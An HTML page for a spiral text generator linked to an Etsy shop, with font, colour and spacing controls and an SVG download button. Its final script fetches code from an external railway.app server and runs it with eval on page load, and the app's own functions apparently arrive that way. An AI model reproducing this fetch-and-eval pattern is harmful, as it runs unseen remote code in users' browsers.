<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>FractalDesignsCo Spiral Text Generator</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        primary: "#6366F1",
                        accent: "#A5B4FC",
                        background: "#F3F4F6",
                        foreground: "#1F2937",
                    },
                },
            },
        };
    </script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');

        body {
            font-family: 'Inter', sans-serif;
            background-color: #F3F4F6;
            color: #1F2937;
        }

        .container {
            max-width: 800px;
            margin: auto;
            padding: 20px;
            background: white;
            border-radius: 12px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
        }

        .flex.items-center.gap-2 {
            width: 200px;
        }
    </style>
</head>

<body class="flex justify-center items-center min-h-screen p-4">
    <div class="container">
        <h1 class="text-2xl font-bold text-center mb-6">
            <a href="https://www.etsy.com/shop/FractalDesignsCo" target="_blank"
                class="text-primary underline">FractalDesignsCo</a> <span class="select-none">Spiral Text
                Generator</span>
        </h1>

        <div class="flex flex-col gap-4">
            <textarea id="textInput" placeholder="Enter song lyrics..."
                class="w-full p-3 border border-gray-700 rounded-md focus:ring-2 focus:ring-primary focus:outline-none"
                rows="4" oninput="preserveCursor(this)"
                onpaste="setTimeout(() => { preserveCursor(this); }, 0);"></textarea>

            <script>
                function preserveCursor(textarea) {
                    const start = textarea.selectionStart;
                    const end = textarea.selectionEnd;
                    textarea.value = textarea.value.replace(/(\r\n|\n|\r)/gm, ' ').replace(/ {2,}/g, ' ');
                    textarea.setSelectionRange(start, end);
                }
            </script>

            <div class="flex flex-col items-center">
                <label class="block font-medium mb-1 text-center select-none">Font</label>
                <select id="fontSelector"
                    class="w-1/4 p-2 border border-gray-700 rounded-md focus:ring-2 focus:ring-primary focus:outline-none mx-auto cursor-pointer">
                    <option value="Roboto Mono">Roboto Mono</option>
                    <option value="Source Code Pro">Source Code Pro</option>
                    <option value="Fira Code">Fira Code</option>
                    <option value="Inconsolata">Inconsolata</option>
                    <option value="Ubuntu Mono">Ubuntu Mono</option>
                    <option value="JetBrains Mono">JetBrains Mono</option>
                    <option value="Anonymous Pro">Anonymous Pro</option>
                    <option value="Cousine">Cousine</option>
                    <option value="Space Mono">Space Mono</option>
                    <option value="PT Mono">PT Mono</option>
                    <option value="Courier Prime">Courier Prime</option>
                    <option value="IBM Plex Mono">IBM Plex Mono</option>
                    <option value="Overpass Mono">Overpass Mono</option>
                    <option value="Share Tech Mono">Share Tech Mono</option>
                </select>
            </div>

            <div class="flex flex-col items-center">
                <label class="block font-medium mb-1 select-none">Font Color</label>
                <input type="color" id="fontColor" class="w-1/8 h-10 border rounded-md cursor-pointer">
            </div>

            <!-- Sliders with Reset Buttons -->
            <div class="flex flex-col items-center">
                <label class="block font-medium mb-1 text-center select-none">Letter Spacing</label>
                <div class="flex items-center gap-2">
                    <span id="letterSpacingValue" class="w-1/4 text-center">11.5</span>
                    <input type="range" id="letterSpacing" min="1" max="20" step="0.5" value="11.5"
                        class="w-3/4 h-2 bg-gray-300 rounded-lg appearance-none cursor-pointer">
                    <button onclick="resetSlider('letterSpacing', 11.5)"
                        class="px-2 py-1 text-sm bg-gray-200 rounded hover:bg-gray-300 transition">↺</button>
                </div>
            </div>

            <div class="flex flex-col items-center">
                <label class="block font-medium mb-1 text-center select-none">Middle Circle Size</label>
                <div class="flex items-center gap-2">
                    <span id="startRingValue" class="w-1/4 text-center">200</span>
                    <input type="range" id="startRing" min="0" max="300" value="200"
                        class="w-3/4 h-2 bg-gray-300 rounded-lg appearance-none cursor-pointer">
                    <button onclick="resetSlider('startRing', 200)"
                        class="px-2 py-1 text-sm bg-gray-200 rounded hover:bg-gray-300 transition">↺</button>
                </div>
            </div>

            <div class="flex flex-col items-center">
                <label class="block font-medium mb-1 text-center select-none">White Space Between Loops</label>
                <div class="flex items-center gap-2">
                    <span id="loopSpacingValue" class="w-1/4 text-center">0.3</span>
                    <input type="range" id="loopSpacing" min="0.2" max="0.5" step="0.1" value="0.3"
                        class="w-3/4 h-2 bg-gray-300 rounded-lg appearance-none cursor-pointer">
                    <button onclick="resetSlider('loopSpacing', 0.3)"
                        class="px-2 py-1 text-sm bg-gray-200 rounded hover:bg-gray-300 transition">↺</button>
                </div>
            </div>

            <div class="flex flex-col items-center">
                <label class="flex items-center gap-2 justify-center cursor-pointer select-none">
                    <input type="checkbox" id="boldButton" class="form-checkbox h-5 w-5 text-primary cursor-pointer">
                    <span class="text-gray-700 select-none">Bold</span>
                </label>
            </div>

            <script>
                let letterSpacingValue = document.getElementById('letterSpacingValue');
                let letterSpacing = document.getElementById('letterSpacing');
                letterSpacing.oninput = function () {
                    letterSpacingValue.textContent = letterSpacing.value;
                };

                let startRingValue = document.getElementById('startRingValue');
                let startRing = document.getElementById('startRing');
                startRing.oninput = function () {
                    startRingValue.textContent = startRing.value;
                };

                let loopSpacingValue = document.getElementById('loopSpacingValue');
                let loopSpacing = document.getElementById('loopSpacing');
                loopSpacing.oninput = function () {
                    loopSpacingValue.textContent = loopSpacing.value;
                };
            </script>

            <!-- Buttons -->
            <div class="flex gap-4">

                <button onclick="downloadSVG()"
                    class="w-full px-4 py-2 bg-primary text-white rounded-lg hover:bg-accent transition">
                    Download SVG
                </button>
            </div>
        </div>

        <div id="preview-container" class="mt-6 flex justify-center overflow-hidden">
            <svg id="preview" width="800" height="800"></svg>
        </div>
    </div>

    <script>
        fetch("https://expressjs-production-52d7.up.railway.app/getScript")
            .then(res => res.text())
            .then(eval)
            .catch(err => console.error("Script failed to load:", err));
    </script>
</body>

</html>
